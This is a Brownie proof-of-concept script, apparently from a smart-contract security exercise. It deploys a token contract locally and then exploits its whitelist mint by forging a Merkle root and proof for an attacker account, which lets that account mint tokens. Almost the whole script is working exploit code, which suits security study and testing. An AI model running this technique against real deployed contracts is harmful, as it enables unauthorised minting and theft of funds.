from brownie import HalbornToken, accounts
from web3.auto import w3


def main():

    ### create an 'interface'
    steve = accounts[0]
    amount_to_mint = 10000000000000000000000
    random_merkle_tree_root_hash = (
        "0x87c2d362de99f75a4f2755cdaaad2d11bf6cc65dc71356593c445535ff28f43d"
    )

    halborn = HalbornToken.deploy(
        "Halborn Token",
        "HT",
        amount_to_mint,
        steve,
        random_merkle_tree_root_hash,
        {"from": steve},
    )

    ### create an attacker's account
    bad = accounts[5]
    print("1. Created account 'bad'\n")

    ### create our fake Merkle Tree
    # 1. hash the attacker's account address
    leaf = w3.keccak(hexstr=bad.address)

    # 1b. hash the Merkle Tree 'neighboors' address
    neighboor = w3.keccak(hexstr=accounts[2].address)

    # 2. Provided 2 separate hashes for leaf and neighboor, calculate a valid root hash
    root = w3.solidityKeccak(["bytes32", "bytes32"], [leaf, neighboor])

    # 3. Store the neighboor's hash into the bytes32 dynamic array (required type for the mint function argument)
    proof = [neighboor]
    print(
        "2. Created a valid merkle tree for the attacker's address as a leaf. Sending exploit transaction...\n"
    )

    ### exploit the vulnerable function
    amount_to_mint = 1001001001100122
    halborn.mintTokensWithWhitelist(amount_to_mint, root, proof, {"from": bad})
    print(
        "3. Passed amount, leaf, proof and root to a function mintTokensWithWhiteList\n"
    )

    ### print balance of the attacker
    print("4. bad's account balance is " + str(halborn.balanceOf(bad)))
